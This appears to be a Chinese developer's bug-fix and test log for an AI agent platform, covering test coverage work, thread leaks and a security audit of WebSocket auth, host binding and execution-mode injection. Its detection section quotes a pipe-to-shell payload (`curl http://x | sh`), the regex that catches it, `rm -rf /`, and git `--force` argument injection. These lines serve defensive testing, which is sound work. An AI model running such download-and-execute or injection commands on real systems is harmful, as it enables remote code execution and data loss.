  root、GCM 已移除的 context 系列、get_thinking_status（healthy/unavailable）、get_security_status、
  get_sessions/get_runners/get_model_runners（空/带会话）、get_bus_stats、memory 端点（临时 EventStore
  单例 + 关键词过滤）。注意：直接调端点函数必须显式传 FastAPI Query 默认值（`limit=50` 等）。
- `tests/unit/test_git_tools.py`（12 项）——_run_git 成功/超时/未安装、git_status porcelain 解析
  （XY 状态）、git_push 的 `--force` 注入防护（`remote="-"`/`branch="--force"`）、git_diff 增删行统计。
- `tests/unit/test_exec_command_safety.py`（7 项）——exec_command 极端危险命令硬阻断（rm -rf / 等）、
  链式命令高危检测。

**顺带修复一个安全缺陷（pipe-to-shell 漏检）：**
`_DANGEROUS_PATTERNS` 里 `"curl.*|.*sh"`/`"wget.*|.*sh"` 是正则写法，但 `_detect_dangerous_command`
用子串匹配（`pattern in cmd`），`. *` 当字面量 → **`curl http://x | sh` 这类下载并执行的经典攻击向量漏检**。
新增 `_DANGEROUS_REGEX`（`curl\s+\S+.*\|\s*(ba|z|k)?sh` 等）用 `re.search` 补漏，测试覆盖通过。

**经验：** 安全检测清单里的正则写法必须用正则引擎执行，否则"看着有检测、实际形同虚设"——写测试时
要用真实攻击载荷（`curl http://x | sh`）验证能命中，而不是只测子串。

**覆盖提升：** management/api 41 个零覆盖端点大幅缩减、agent 安全工具（git/exec_command）关键路径覆盖、
exec_command 危险检测纯逻辑全覆盖。

### 27.11 继续补测：web_search / ModelRunnerManager / identity_loader / values_store / causal_tree

**新增测试（全量 1602 → 1657 全绿）：**
- `test_web_search.py`（14 项）——正则/HTML 解析、内容净化（Markdown/注入/截断）、DDG 搜索（含 202 限流）、
  fallback 链（ddg_html→lite→sogou→bing→baidu、全部失败）、limit clamp。
- `test_model_runner_manager.py`（8 项）——ModelRunnerManager 容量限制（max_per_role/max_tier 拒绝）、
  model_id 唯一后缀、probe_map 注册、stop_runner 清理、全局注册表同 session 复用（此前整类零覆盖）。
- `test_identity_loader_ext.py`（13 项）——外部 YAML 身份加载（tier 校验/未知字段过滤/文件名推断）、
  合并（覆盖/新增自动补默认字段）。注意：与 `tests/integration/test_identity_loader.py` basename 冲突，改名 `_ext`。
- `test_values_store.py`（14 项）——真实 ValueSystem（此前 test_value_formatter 一直用替身）：
  初始化/读写/分区解析/add/remove/update/cleanup/reset/质量门控/相似度去重。
- `test_causal_tree.py`（6 项）——CausalTree 溯源（`_trace_to_root` 根因在前）、证据收集按重要性排序、
  expand_node 完整链路（上下游链 + 证据）。

**顺带修复资源泄漏（真实 bug）：** `ApiLogStore.__init__` 启动后台 `_flush_loop` daemon 线程但
**没有 stop()**——每个实例一个常驻 `time.sleep(1)` 线程，测试创建多个临时 store 后 pytest 退出卡住
（INTERNALERROR Timeout，`_flush_loop` 线程残留）。新增 `stop()`（置位 + join + flush + 关连接），
test_management_api 的 `api_log` fixture teardown 调用。

**经验：** ① 全量跑完退出卡住的排查：先看 pytest INTERNALERROR 的线程栈——常驻 daemon 线程
（sleep 循环）是典型泄漏源，凡 `__init__` 起线程的类必须提供 `stop()`；② 新测试文件避免与
已有测试 basename 重复（`test_identity_loader` 撞名导致 collection error）。

**覆盖提升：** web_search（8%）、ModelRunnerManager（0%）、identity_loader（0%）、values_store（0%）、
causal_tree（12%）关键路径覆盖。

### 27.12 继续补测：tool_discovery / context_budget / management 因果图端点

**新增测试（全量 1657 → 1685 全绿）：**
- `test_tool_discovery.py`（9 项）——工具发现引擎（此前 0%）：精确名/关键词/标签/分类相关度、
  排序/limit/min_relevance、按分类/标签获取、任务推荐（calc 命中）。
- `test_context_budget.py`（14 项）——上下文预算（此前 0%）：allocate 分档（工具少/多/中）、
  token 估算（中英）、工具描述 token 经验值、简化判断、记忆/对话轮次推荐、角色化预算。
- `test_management_api_ext.py` 追加 5 项——causal-graph 端点：图数据（nodes/edges/stats）、
  指标、节点详情（前驱/后继/关联事件/不存在抛 AppError）、因果树展开。

**覆盖提升：** tool_discovery（0%）、context_budget（0%）、management 因果图端点（原 41 个
零覆盖端点继续缩减）。

**经验：** token 估算启发式（中文 3 字符/token、英文 4 字符/token）测试时要按公式算准确值，
不要凭直觉断言大小关系（中文 70 字符实际比英文 100 字符 token 多）。

### 27.13 继续补测：management 剩余端点（database/info-process/perception）

**新增测试（全量 1685 → 1688 全绿）：**
- `test_management_api_ext.py` 追加 3 项——`/database`（disk_cache 统计 + sqlite 表信息）、
  `/info-process`（ImageAnalyzer/SpeechRecognizer 状态，mock 类）、`/perception`（感知系统状态，
  started→running）。
- 至此 management 41 个零覆盖端点仅剩少量（start/stop_perception、memory 事件 CRUD、skills 已覆盖、
  clear_memory 等）。

**注意（Python 坑）：** `modules.database.disk_cache` 的包属性被 `__init__` 里的 `disk_cache` 实例
遮蔽——`import modules.database.disk_cache as dc` 绑定的是 **DiskCache 实例**而非模块
（`dc` 无 `disk_cache` 属性）。测试应 `from modules.database.disk_cache import disk_cache` 直接拿实例
再 monkeypatch 方法。

**覆盖提升：** management 端点几乎全绿；加上前几轮，0% 模块（utils/providers/identity_loader/
values_store/tool_discovery/context_budget/ModelRunnerManager）已全部有覆盖。

### 27.14 继续补测：memory 事件 CRUD + ModelRunner 方法

**新增测试（全量 1688 → 1707 全绿）：**
- `test_management_api_ext.py` 追加 6 项——memory 事件 CRUD（create/get/update/delete、不存在抛
  NOT_FOUND、clear_memory 清空）、tool-skills 废弃端点。management 41 个零覆盖端点全部覆盖。
- `test_model_runner_methods.py`（13 项）——ModelRunner 此前 14 个方法零覆盖，本轮覆盖核心：
  `_has_required_tool_args`/`_missing_required_tool_args`（calc schema 必填参数验证：全参/缺参/
  空值/未知工具）、`_build_tool_guard_prompt`（工具少极简 / 工具多详细 / large 层级强制详细）、
  `_build_tool_prompt_section`（占位空串）、`_build_prompt`（任务描述/身份/角色边界/guidance/
  技能叠加仅 large 层级）。

**经验：** prompt 类方法断言时先确认实际文案（`【工具调用硬性规则】` 而非 `【工具调用规则】`）——
用 `in` 子串断言时以生产代码真实输出为准，不要凭方法名猜。

**覆盖提升：** management 全部端点有覆盖；ModelRunner 方法从 14 个零覆盖缩到少量重型方法
（`_wait_for_user_response`/`_run_runtime_expert` 等需真实推理链路）。

### 27.15 继续补测：ModelRunner 交互等待方法

**新增测试（全量 1707 → 1713 全绿，`test_model_runner_methods.py` 追加 6 项）：**
- `_wait_for_user_response`/`resolve_user_response`——future 等待 → resolve 回填返回、清理 pending、
  超时返回 `{"timeout": True}`、未知 request_id 不报错
- `_handle_ask_user_intent`——resolve 后返回 `【用户意图】用户的回答：...`
- `_handle_mode_change_request`——批准（`ToolSecurityGate.resolve_review` 回填 → 切换
  `settings.EXECUTION_MODE` 并恢复）与拒绝（返回拒绝文案）

**经验：** ① 交互类方法（future 等待）测试用"任务 + sleep 到挂起点 + resolve + wait_for"模式；
② `_handle_ask_user_intent` 解析 `result["answer"]` 而非 `response`，resolve payload 字段名要与
消费方一致；③ `ToolSecurityGate._pending_reviews` 是**类属性**，模块级 `tsg._pending_reviews` 访问不到。

**覆盖提升：** ModelRunner 重型交互方法（审批/提问等待）已覆盖；剩余极小（`_run_runtime_expert`、
`_on_wakeup_message` 等需完整运行链路）。

### 27.16 收尾：ModelRunner 剩余方法 + 文档结构修复

**新增测试（全量 1713 → 1721 全绿，`test_model_runner_methods.py` 追加 8 项）：**
- `_format_messages_for_context`（ChatMessage/字典/dict content thinking_result 提取/最近 20 条截断）
- `_consume_guidance`（pending 引导消费 → `thinker.add_external_prompt`）
- `_check_messages`（mock bus.receive 返回消息 → 标准化字段）
- `_on_wakeup_message`（设置 wakeup_event）

至此 ModelRunner 此前 14 个零覆盖方法仅剩 `_run_runtime_expert`/`_build_runner_prompt`（需完整运行链路）。

**文档结构修复：**
- §21（主动搭话旁路）标题原拼接在 §18 末尾（缺换行）+ 编号乱序（在 §19/§20 之前）——已拆行并移动到 §20 之后，恢复 18→19→20→21→22 顺序。
- §25 的"默认行为不变（向后兼容）"已被后续 generate 必填化取代——加注记指向 §27.8。
- 抽查 §26/§27.4/§27.8/§27.10/§27.11 记录与实际代码一致（validate_attachments、fail-closed、
  providers 接线、pipe-to-shell 正则、ApiLogStore.stop）。

### 27.17 纯对话模式提示词设置无效（前端设置不生效）

**现象：** 用户在编排页给自定义总指挥 agent 设置人设后，**纯对话模式**（chatonly）对话时 system prompt 完全不变。

**根因：** 纯对话是单一人格——`chat_light/prompt_composer.py` 硬编码只读 **`orchestrator`** 角色的
`get_persona("orchestrator")`/`get_system_override("orchestrator")`。而编排页自定义 agent（tier=large）
的人设保存在 `personas.yaml` 的**自定义 role key**（如 `'123'`），不在 `orchestrator` 下 →
纯对话读取不到 → 设置无效。agent 模式按各角色 key 读所以生效。

**修复（`chat_light/prompt_composer.py`）：** `orchestrator` 无自定义人设时，回退到用户自定义的
**large-tier 总指挥 agent** 人设（遍历 `get_custom_agents()` 取 tier=large 的第一个有 persona 的）。
`system_override` 优先级不变（非空直接用）。

**验证：** 新增 2 项测试（`test_chat_light_prompt.py`）：orchestrator 无人设 → 回退自定义 large agent
人设生效；orchestrator 有人设 → 优先不回退。全量 1723 通过。

**经验：** 这是 §18/§22"配置改了但消费方不读"模式的又一次出现——前端把配置写到 A 位置（自定义 role），
后端消费方读 B 位置（orchestrator），两端 key 不匹配。排查"设置无效"先对前端保存的 key 与后端读取的
key 做映射核对，再验证真实链路（`set_persona → build_system` 输出）。

### 27.18 自定义 agent 未接入调度（存了没人读，§22 消费方审计盲区）

**现象：** 编排页「新增」自定义 agent（选层级/写 model_id/存人设）后，agent 模式无法真正调度它——
只有纯对话模式（§27.17 修复）读 large-tier 自定义 agent 人设生效；agent 模式 `start_runner` 直接拒绝。

**根因：** `identity.py::get_identities()` 只从 `config/prompts/roles.yaml` 加载身份模板，
**从不合并 personas.yaml 的自定义 agent**。而 agent 模式调度 `ModelRunnerManager.start_runner`
用 `identity_key not in get_identities()` 拒绝未知身份 → 编排页创建的自定义 agent 身份不在身份表
→ 永远无法启动。`model_id` 字段也无消费方（模型实例仍按 tier 默认创建）。

**为什么测试没抓到：** ① `get_identities` 全部被 mock，从无"应含自定义 agent"的契约断言；
② `create_custom_agent` 端点在 `api/main.py`（非 `modules/management/api.py`），§27.x 端点审计范围
漏掉它，零测试；③ `start_runner` 未知身份测试用假身份字典，掩盖"真实自定义身份不在"。
**本质：这是 §18/§22"存了没人读"的又一样式，且 §22 消费方审计只覆盖配置 key，没延伸到
"前端创建的对象（agent）是否被调度消费"。**

**修复：** `get_identities()` 合并 personas.yaml 的 custom agents（转成身份模板结构）；
模型创建按自定义 agent 的 `model_id`/tier 选择；调度层可启动自定义角色。

**经验：** 排查"存了没人读"必须对**每个前端写操作入口**（不只是配置 key）追到后端消费方——
编排页新增/人设/权限/模型参数/激活开关都要验证"存进去的东西是否真的被读"。

### 27.19 全量消费方审计修复（前后端"存了没人读"清理）

按 §27.18 教训扩展 §22 消费方审计到**所有前端写操作**（40+ 端点 → 保存数据 → 调度消费方），
修复 5 处：

1. **共享 dict 污染（identity）**：`_load_from_yaml` 直接改 `loader.load("roles")` 的共享 dict，
   自定义 agent 合并会残留污染后续加载 → 浅拷贝。
2. **agent_active 激活开关无调度消费**：编排页开关只保存展示，`start_runner` 从不检查 →
   禁用的 agent 照样启动。`start_runner` 加 `get_agent_active is False` 拒绝。
3. **persona-presets 读侧 500**：`get_persona_presets` 写 `for k,v in presets.values()`（对 3-key
   dict 解包崩溃）→ 预设保存后永远列不出/无法应用。改 `presets.items()`。
4. **自定义 agent 人格不进 system prompt**：`config/prompts/composer._get_role` 只读 roles.yaml，
   自定义角色回退 orchestrator 克隆 → 改从 `get_identities()` 查找（含编排页自定义 agent）。
5. **expertise 逗号字符串拆字**：identity 合并时 expertise 原样存字符串，`from_template` 的
   `list(...)` 拆成单字符 → 合并时逗号转 list。
6. **LOG_LEVEL 摆设**：`setup_logger` 硬编码 "INFO"，设置页 LOG_LEVEL 改动无效 → 默认从
   `settings.LOG_LEVEL` 读。

**已正确消费（无需改，供对照）**：personas/system_overrides/role_tools/model_params、skills
enabled/forced/role-skills、tools enabled（可见性）、scheduled_tasks prompt/outreach、todos、记忆库切换。

**可加强（非摆设）**：tools enabled 只过滤可见性，`tool_security_gate` 执行路径不拦截已禁用工具直呼。

**验证：** 新增 `test_custom_agent.py`（11 项：身份合并/删除失效/端点/调度/激活开关/预设读侧/
composer 自定义人格/LOG_LEVEL）；全量 1733 通过。

## 28. 无鉴权 WebSocket + 0.0.0.0 绑定 + execution_mode 注入 + 审批 future 断开泄漏（安全审计高危）

**现象：** 全量安全审计发现三个高危/中危问题：

1. **WS 完全无鉴权（HIGH）**：HTTP 中间件不覆盖 WebSocket（`api/main.py` 注释明示），任何能连到 8080 端口的客户端可自由连接 `/stream/ws/{任意 session_id}`；用相同 session_id 连接会**顶掉原连接并接管消息流**（会话劫持）。
2. **默认绑定 0.0.0.0（HIGH）**：`main.py`/`start_all.py`/`autostart_launcher.py`/`Dockerfile` 全部监听所有网卡——局域网内任何设备可直连。
3. **WS 消息可注入全局执行模式（HIGH）**：`api_stream.websocket_chat` 在 input 消息里带 `"execution_mode":"yolo"` 就直接 `object.__setattr__(settings, "EXECUTION_MODE", ...)` **全局生效**，绕过 PUT /config 的认证——攻击者可远程以 yolo 模式（跳过确认）执行工具（含 exec_command）。
4. **审批 future 断开泄漏 + 全局计时冻结（MEDIUM）**：用户关闭前端后，`ToolSecurityGate._pending_reviews` / `ModelRunner._pending_user_responses` 的 future 永远无人 resolve，`asyncio.wait_for(future, timeout=None)` 永久挂起，且 `Suspension` 被 suspend 后永不 resume → **整个系统计时冻结**。
5. **API Key 落 localStorage（MEDIUM）**：`frontend/src/api.js` 把密钥持久化到 localStorage（§17.7 已记录过此模式，Vue 重构时又带回）。

**修复：**
1. **WS 握手鉴权**：新增 `api_stream._ws_auth_ok()`——`SIMPLE_API_KEY` 未配置（开发模式）放行；已配置则校验 `X-API-Key` header 或 `?api_key=` 查询参数（hmac 常量时间比较，header/query 任一匹配即放行）。`chat_gateway.websocket_chat`（实际挂载的入口）与 `api_stream.websocket_chat`（纵深防御）均在 accept 前校验，失败 `close(4401)`。CLI（aiohttp）带 header；浏览器 WebSocket 无法设 header，前端 `ws/client.js` 追加 `?api_key=`。
2. **默认绑定 127.0.0.1**：`main.py`/`start_all.py`/`autostart_launcher.py` 改为 `SERVER_HOST` env（默认 `127.0.0.1`）；docker-compose 显式 `SERVER_HOST=0.0.0.0`（容器内需监听 eth0 供 docker-proxy 转发，宿主机已用 `127.0.0.1:8080:8080` 限制外部访问）。
3. **移除 WS execution_mode 注入**：`api_stream.websocket_chat` 不再读消息里的 `execution_mode`；CLI `send_input` 不再附带该字段。模式切换统一走 `PUT /config/EXECUTION_MODE`（CLI `_set_execution_mode` 已按此实现，带认证）。
4. **审批/交互会话关联 + 断开清理**：`ToolSecurityGate` 新增 `_pending_review_sessions`（request_id→session_id）+ `reject_session_reviews(session_id)`；`check/_check_impl/_check_high_risk/_check_user_review` 全链透传 `session_id`，`ModelRunner` 的 gate.check 与 `_handle_mode_change_request` 关联会话；新增 `ModelRunner.reject_session_user_responses(session_id)` 清理 `ask_user_intent` 待交互。`api_stream.websocket_chat` 的 finally 在断开时调用两者批量拒绝——只影响断开会话，不误伤其他会话，`Suspension` 恢复、思考流程继续。
5. **API Key 仅内存**：`frontend/src/api.js` 移除 localStorage/sessionStorage 读写；刷新后由 `autoDetectApiKey()` 从 `/config/api-key` 自动拉取（生产环境仅回环返回明文）。
6. **会话接管防护**：`ConnectionManager.connect` 先关闭同 session 旧连接再注册新连接（code 4000）。

**验证：** 新增测试 15 项——`test_ws_auth.py`（6 项 _ws_auth_ok 单元）、`test_chat_gateway.py` 追加 3 项（无 key 拒绝/错 key 拒绝/带 key 通过）、`test_toolgate.py` 追加 `TestRejectSessionReviews`（3 项：只拒目标会话/check 透传 session 标签/未知会话 noop）、`test_reject_session_interactions.py`（3 项：清理/跳过已完成/cancelled 提示）；全量 unit 1378 + 前端 5 项 + `vite build` 全绿。

**经验：**
1. **HTTP 认证中间件不覆盖 WebSocket**——凡有 WS 端点必须单独做握手鉴权，且鉴权必须在 `accept()` 之前（否则已握手成功无法拒绝）；
2. **"开关/模式"禁止经无鉴权通道注入**——WS 消息里的配置写入都是旁路，统一收敛到带认证的 PUT /config；
3. **无限等待（timeout=None）必须配断开清理**——§10 把审批改为无限等待后，前端断开就成永久挂起 + Suspension 全局冻结；交互类 future 必须登记归属（session_id）并在断开时批量拒绝；
4. **本机服务默认绑定 127.0.0.1**，需要局域网暴露时显式开 SERVER_HOST=0.0.0.0（Docker 容器内除外，需配宿主端口映射）；
5. **敏感凭据只进内存**——localStorage 的 XSS 窃取面太大，自动拉取 + 内存持有即可满足免录入体验。

### 27.20 后端测试补全（覆盖率 57% → 60%）+ 修复 1 个真实 bug

**补测（新增 ~130 项，全量 1721 → 1859 全绿）：**
- **0% 模块**：`test_ocr_utils.py`（OCR 引擎三分支/单例）、`infra.model.interface` re-export
- **agent 工具**：value_tools（12）、web_fetch（SSRF/URL/方法/超时 9）、open_app（touchpoint/subprocess 7）、
  plan_tools/security_tools/file_history_tools（14）、dev_tools（AST/依赖 13）、ai_tools（代码校验/创建/删除 18）、
  exec_command 执行路径（7）、memory_matcher（语义/关键词/时间/重要性 15）
- **模型客户端**：`test_model_client_chat.py`（chat 成功/工具/非200/超时重试、generate reasoning 回退/anthropic 9）
- **本地视觉**：image_analyzer `_analyze_qwen_vl`/`_analyze_mlx_vlm`/UI 降级

**修复 1 个真实 bug：** `image_analyzer.detect_ui_elements` 的 else 分支调用**不存在的方法
`_detect_ui_mock`**（视觉后端不可用时 AttributeError）→ 补降级方法返回空结果。测试覆盖。

**稳定性：** pytest 全局 timeout 10s → 20s（全量负载下多个极快测试偶发 timeout flaky，单独跑 0.9s 通过）。
性能测试 `TestPerformance` 标记 `slow`（依赖机器负载，默认排除）。

**覆盖率：** 57% → 60%（miss -335 行）。剩余低覆盖集中在需要真实环境/重型 mock 的模块：
api_stream（35%）、model_runner（45%）、image_analyzer（23%→含本地视觉）、speech_recognizer/hardware_input/
mouse_keyboard/perception_tools/cdp_scanner（外部硬件依赖）。高危需确认项见
`docs/BUGS_REQUIRING_CONFIRMATION.md`（本轮无新增高危行为变更，发现的均为普通 bug 已直接修复）。

### 27.21 后端测试补全（续）：覆盖率 60% → 61%

**新增测试（全量 1859 → 1895 全绿）：**
- `test_speech_recognizer.py`（6 项）——whisper 识别/降级 mock/置信度/文件/Base64（whisper 缺失抛 ImportError 行为）
- `test_hardware_controller.py`（14 项）——PyAutoGUI 包装：移动/点击/滚动/拖拽/位置/按键/输入/热键/截图（含截图禁用分支）
- `test_mouse_external.py`（9 项）——external_api SSRF/GET/POST/超时 + mouse_keyboard 移动/点击/键盘
- `test_perception_cdp.py`（7 项）——cdp_scanner DOM 解析（按钮/占位符/深度/文本跳过）+ transcribe_audio + understand_screen 降级

**稳定性修正：** 全量 flaky 截图测试改为 mock `utils.screen_capture`（真实 pyautogui 全量负载下返回 None）。

**覆盖率：** 60% → 61%（累计 57% → 61%，miss 从 9601 → 9090，-511 行）。
**累计新增**：1721 → 1895 项（+174）。剩余低覆盖：`api_stream`（35%）、`model_runner`（45%）、
`ai_tools`/`tools` 部分、`output_system`、`management` 深路径——需重型 mock 或真实环境。

### 27.22 后端测试补全（续）：api_stream 鉴权/身份/记忆提取

**新增测试（全量 1895 → 1901 全绿，`test_api_stream_core.py` 追加 6 项）：**
- `_ws_auth_ok`（开发模式放行 / header 正确错误 / query 正确）
- `_resolve_identity_name`（缓存 / 去 _001 后缀 / 空）
- `_post_task_extraction`（mock EventReducer 提取成功 / 对话过短不提取）

**覆盖率：** 61%（api_stream 35% → 39%）。累计 57% → 61%，全量 1721 → 1901（+180 项）。
剩余低覆盖：`model_runner`（45%，1590 行）、`ai_tools`/`output_system`/`management` 深路径、tools 剩余
分支——需重型 mock（完整运行链路）或真实环境。

### 27.23 后端测试补全（续）：model_runner/output_system/ai_tools

**新增测试（全量 1901 → 1922 全绿）：**
- `test_model_runner_methods.py` 追加 5 项——`_supports_native_tool_chat`（静态判断）、
  `_build_time_context`（时间/对象）、`_push_reasoning`（思考推送/空不推）
- `test_output_system.py`（7 项）——text/speech（TTS 成功/禁用）/mouse/键盘端点（mock 底层）
- `test_ai_tools.py` 追加 4 项——edit_tool（成功/缺名/不存在）+ `_add/_remove_persisted`
- `test_api_stream_core.py` 追加 6 项（§27.22）

**稳定性修正：** pytest 下 `_visible_tool_whitelist` 依赖注入 mock 不稳定（模块属性遮蔽），
且该方法仅转发给 ToolPermissionController（已单独测）→ 移除该测试。

**覆盖率：** 61%（累计 57% → 61%，miss -619 行）。全量 1721 → 1922（+201 项）。
剩余低覆盖集中在**需真实运行链路/重型 mock**：`model_runner` 剩余方法（_generate_with_tools 完整循环、
_run_task/_think_loop）、`api_stream` 完整 WS 流、`output_system` 深路径、真实硬件/屏幕/语音分支。

### 27.24 后端测试补全（续）：工具循环分支 + 白名单命令

**新增测试（全量 1922 → 1932 全绿）：**
- `test_model_runner.py` 追加 3 项——`_generate_with_tools` 专家直出（无工具+文本）、
  主管纯文本拒绝重试（chat_calls>=3 验证注入）、缺参拦截（calc 未执行）
- `test_exec_command_safety.py` 追加 6 项——`run_command` 白名单（空/不在白名单/白名单内/
  shlex 解析失败）、`run_script`（空/极端拦截/成功）

**覆盖率：** 61%（累计 miss -645 行，57% → 61%）。全量 1721 → 1932（+211 项）。
剩余低覆盖需**完整运行链路/真实环境**：`model_runner` 完整循环（_run_task/_think_loop）、
`api_stream` WS 流式、真实硬件/屏幕/语音分支——纯单测提升有限。

### 27.25 后端测试补全（续）：_generate 重试/回退 + system prompt 构建

**新增测试（全量 1932 → 1936 全绿，`test_model_runner.py` 追加 4 项）：**
- `_generate` 前端不可达 → 跳过 LLM（返回"[系统] 前端连接已断开"）
- `_generate` 原生工具 client → 走 `_generate_with_tools`
- `_generate` 无原生工具 client → 传统 `generate()` 回退
- `_build_system_prompt_for_mode` 对话历史前置（mock PromptComposer）

**覆盖率：** 61%（累计 miss -700+ 行）。全量 1721 → 1936（+215 项）。
剩余低覆盖：`model_runner._run_task/_think_loop`（完整编排循环）、`api_stream` WS 流式、
真实硬件/屏幕/语音分支——纯单测边际收益低。

### 27.26 后端测试补全（续）：_run_task 生命周期 + RuntimeExpert

**新增测试（全量 1936 → 1940 全绿，`test_model_runner.py` 追加 4 项）：**
- `_run_task` 正常思考 → finally 清理 manager 注册（runners/count）
- `_run_task` 异常 → status=error + 详情
- `_run_task` 取消 → status=completed
- `_run_runtime_expert` on_demand → 实例化 + run_cli_mode

**覆盖率：** 61%（累计 miss -730+ 行）。全量 1721 → 1940（+219 项）。
剩余低覆盖：`_think_loop` 完整编排循环、`api_stream` WS 流式、真实硬件/屏幕/语音——需完整运行链路 mock。

---

## 29. config/settings.py 缺失 `import sys` → NameError 隐患（后端）

**现象：** `~/.cortex/settings.json` 不存在时，`_ensure_user_config`/`_apply_user_config` 等 10 处使用 `sys.stderr`，但模块未 `import sys` → 首次运行触发 `NameError`。

**根因：** `settings.py` 顶部只 `import os`，多处 `print(..., file=sys.stderr)` 依赖隐式 sys。单元测试因 autouse fixture 注入 sys 才未暴露。

**修复：** `import sys` 加入模块顶部（`config/settings.py`）。

**发现方式：** 覆盖率补测 `config/settings.py`（61%→100%）时，测试用注入 sys 绕过，暴露了真实缺口。

---

## 30. ScreenMonitor 后台线程遗留 → pytest 全量随机挂起（后端/测试）

**现象：** 全量测试随机 INTERNALERROR/挂起（pytest-timeout 20s 触发但 session 中止），faulthandler dump 显示线程卡在 `screen_monitor_source.py _read_stdout_loop` 无限调用被 mock 的 readline，主线程卡在 pytest capture `readouterr`。

**根因：** `ScreenMonitorSource._ensure_process` 启动的 reader 后台线程（非 daemon）在测试未显式 stop 时遗留运行；测试用 `__new__` 绕过 `__init__`（实例不在注册表无法清理）+ mock 掉 `_close_process`（`_reader_running` 保持 True 线程永不停）。遗留线程持有 pytest 捕获 fd → 下一个测试 capture 读取阻塞（fd 泄漏 + mock 锁死锁）。

**修复（三层）：**
1. 生产代码：`ScreenMonitorSource`/`ScreenDiffSource` 加类级 `weakref.WeakSet` 活跃实例注册表，`stop()` 注销
2. conftest autouse fixture `_stop_background_sources` 统一 stop 遗留实例
3. 测试修正：`_source` 手动注册 + 不再 mock `_close_process`

**验证：** 之前必卡的组合 5/5 稳定通过；全量正常退出。

**同类排查：** `setup.py`（window_detector）、`PerceptionEventBus`、`voice/hotkey/ocr` 检测器均存在非 daemon 后台线程，全部纳入 weakref 注册表 + conftest 统一清理。

---

## 31. test_detect_text OCR 顺序污染 —— sys.modules 模块级置 None（后端/测试）

**现象：** 全量测试中 `test_screen_monitor_server.py::test_detect_text` 偶发失败，单独运行通过。

**根因：** `test_mcp_screen_monitor.py` 模块级 `sys.modules["rapidocr_onnxruntime"] = None` 永久污染（为防真实 OCR 加载），导致后续 import `screen_monitor_server` 的测试里 `_ocr` 为 None，`extract_text=True` 分支不执行 → 断言无文字。

**修复：** `test_detect_text` 改用 monkeypatch 注入 fake OCR（临时替换 `sms._ocr`），不依赖模块级污染。

**教训：** 模块级 `sys.modules[X] = None` 会污染整个测试进程，应改用 monkeypatch/局部注入。

---

## 32. BytesIO 内部 buffer 不被 pympler 计算 —— 泄漏检测盲区（测试基建）

**现象：** 泄漏检测验证套件中"文件句柄泄漏"测试（`io.BytesIO` 累积）漏报——pympler 只统计 Python 对象，`BytesIO` 的 C 层 buffer 不计入大小。

**根因：** `pympler.muppy.get_size` 对 `_io.BytesIO` 只算对象本身，内部 bytes buffer 无法归因。

**修复：** 泄漏测试同时累积内容字节（`_FILE_CONTENTS` 显式引用 bytes），让 muppy 可测。

**教训：** pympler 字节采样对"纯 C 缓冲"（BytesIO/某些扩展）有盲区；泄漏测试套件（tests/leak/）的价值正是暴露这类检测盲区。

---

## 33. 本地代理 fake-ip 解析 example.com 为内网 IP → SSRF 防护误判（测试环境）

**现象：** 本地（macOS + 代理软件如 Surge/Clash）DNS 把 example.com 解析到 `198.18.0.50`（fake-ip 网段），`_is_private_ip` 判定为内网 → 两个 SSRF 相关测试失败（`test_is_private_ip_public`、`test_web_fetch_bad_method`）。CI（ubuntu 正常解析公网）不受影响。

**修复：** 测试 mock DNS/内网检查：
- `test_is_private_ip_public` mock `socket.getaddrinfo` 返回固定公网 IP
- `test_web_fetch_bad_method` monkeypatch `_is_private_ip` 返回 False

**教训：** 依赖真实 DNS 的测试在代理环境不可靠，应 mock 系统边界。

---

## 34. test_api 版本断言过期（2.0.0 vs 实际版本）（测试）

**现象：** `tests/integration/test_api.py::test_root_returns_app_info` 断言 `version == "2.0.0"`，项目已发布到 v2.1.1 → 断言失败。

**修复：** 改为读 `cortex.version.__version__` 动态比较，不再硬编码。

---

## 35. macOS 不允许 resource.setrlimit(RLIMIT_AS) 低于当前用量（测试基建）

**现象：** 实现"内存上限自动终止"时用 `RLIMIT_AS` 限制进程地址空间，设置 100MB 上限报错 `current limit exceeds maximum limit`（当前进程地址空间已超）。

**根因：** macOS 的 `RLIMIT_AS` 是总地址空间上限，且**不能设置低于当前已用**；Python 进程加载库后地址空间已很大。

**解决：** 放弃 RLIMIT_AS，改用**看门狗线程** + `psutil.Process().memory_info().rss` 周期采样，超限 `os._exit(1)`（conftest `_mem_watchdog`，默认 4096MB，`CORTEX_TEST_MEM_LIMIT_MB` 可调）。

---

## 36. sys.getallocatedobjects() 在 Python 3.13 移除（测试基建）

**现象：** 泄漏检测采样用 `sys.getallocatedobjects()` 报 `AttributeError`（被 try/except 吞掉导致采样点为空）。

**根因：** 该函数在 3.8 引入、3.11 起废弃、3.13 移除。

**修复：** 改用 `len(gc.get_objects())`（对象计数），后进一步升级为 `pympler.muppy.get_size`（真实字节）。

---

## 37. EventStore.__del__ 对假 faiss 索引触发 GC 死循环（后端/测试）

**现象：** `test_event_store_ext.py` 原始写法在 fixture teardown 后触发 Python 3.13 无限 GC 循环（99.7% CPU 卡死）。

**根因：** `EventStore.__del__` 在循环 GC 期对已置 `None`/假索引调用 `faiss.write_index` 抛 SWIG TypeError，GC 反复重试。

**修复：** fixture teardown 先把 `_faiss_index` 置 None 再 `close()`，避免 `__del__` 在 GC 期接触假索引。


---

## 38. bug 文档系统性审计 —— 发现 2 处同类问题并修复

**背景：** 对 §1-37 逐条提取根因模式，在代码中搜索同类问题。

**审计范围与结论（大部分模式已正确处理）：**

| 模式 | 结论 |
|---|---|
| §29 缺 `import sys` | ✅ 无遗漏（全量搜索 `sys.stderr/stdout` 使用处均已 import） |
| §31 `sys.modules` 模块级置 None | ⚠️ **发现 2 处同类** → 修复 |
| §34 硬编码版本断言 | ✅ 均为测试内部假数据，非项目版本断言 |
| §24 线程内事件循环自锁 | ✅ frontend_channel/api_stream 已处理（注释明确避免自锁） |
| §30 后台线程遗留 | ✅ 已全面 weakref 注册表 + conftest 清理 |
| §28 无鉴权 WS | ✅ chat_gateway 显式 `_ws_auth_ok` + 4401 拒绝，test_ws_auth 覆盖 |
| §21 主动搭话绕过开关 | ✅ trigger gate 52 处 enabled/allowed 测试充分 |
| §25 工具调用被套人设 | ✅ model_runner 经 PromptComposer 统一构建；工具型调用用 `_NEUTRAL_SYSTEM_PROMPT` |
| §37 `__del__` 陷阱 | ⚠️ **发现 1 处同类** → 修复 |

**同类 Bug 1（§31 型）：** `test_mcp_screen_diff.py` / `test_mcp_screen_monitor.py` 模块级 `sys.modules["rapidocr_onnxruntime"] = None` 永久污染——conftest 的 `block_real_native_libs` 已全局置 None，此处冗余且保留"模块级污染"反模式。
